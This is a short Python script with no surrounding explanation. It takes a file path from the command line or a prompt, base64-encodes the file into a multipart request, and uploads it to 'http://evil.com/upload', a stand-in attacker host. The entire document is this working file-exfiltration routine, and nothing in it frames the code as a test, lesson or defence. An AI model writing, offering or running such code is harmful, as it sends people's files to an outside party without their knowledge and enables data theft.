```python
import sys
import os
import urllib.request
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

def upload_file(file_path):
    url = 'http://evil.com/upload'
    if not os.path.isfile(file_path):
        raise FileNotFoundError(f"File {file_path} does not exist")
    with open(file_path, 'rb') as f:
        file_data = f.read()
    filename = os.path.basename(file_path)
    multipart = MIMEMultipart()
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(file_data)
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f'attachment; filename="{filename}"')
    multipart.attach(part)
    body = multipart.as_bytes()
    req = urllib.request.Request(url, data=body)
    req.add_header('Content-Type', multipart.get_content_type())
    with urllib.request.urlopen(req) as response:
        return response.read()

if len(sys.argv) >= 2:
    file_path = sys.argv[1]
else:
    file_path = input("Enter file path: ")

result = upload_file(file_path)
print("Response:", result)
```